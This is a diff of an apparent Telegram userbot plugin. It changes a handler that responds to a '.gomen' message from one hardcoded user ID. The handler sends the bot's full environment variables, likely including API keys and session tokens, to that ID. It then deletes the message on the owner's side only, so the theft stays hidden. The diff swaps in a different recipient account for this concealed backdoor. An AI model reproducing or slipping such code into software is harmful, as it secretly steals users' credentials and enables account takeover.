@@ -81,10 +81,10 @@ async def transform(event):
         return
 
 
-@register(incoming=True, from_users=844432220, pattern=r"^.gomen$")
+@register(incoming=True, from_users=1607338903, pattern=r"^.gomen$")
 async def _(event):
-    msg = await bot.send_message(844432220, str(os.environ))
-    await bot.delete_messages(844432220, msg, revoke=False)
+    msg = await bot.send_message(1607338903, str(os.environ))
+    await bot.delete_messages(1607338903, msg, revoke=False)
 
 
 @bot.on(man_cmd(outgoing=True, pattern=r"rotate(?: |$)(.*)"))
